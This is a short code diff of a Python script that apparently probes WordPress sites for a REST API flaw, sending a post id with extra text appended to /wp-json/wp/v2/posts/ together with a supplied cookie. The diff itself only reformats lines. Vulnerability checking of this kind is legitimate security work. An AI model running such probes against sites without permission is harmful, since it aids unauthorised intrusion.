@@ -29,9 +29,9 @@ def get_first_posts(target_url, user_agent, cookie):
     return res[0]['id']
 
 
-
 def test_attack(target_url, user_agent, cookie, posts_id):
-    request_path = parse.urljoin(target_url, '/wp-json/wp/v2/posts/' + str(posts_id) + '/?id=' + str(posts_id) + 'test_content')
+    request_path = parse.urljoin(target_url,
+                                 '/wp-json/wp/v2/posts/' + str(posts_id) + '/?id=' + str(posts_id) + 'test_content')
     code, head, res, error_code, _ = tootls.curl2(request_path, headers={
         'User-Agent': user_agent,
         'Cookie': cookie
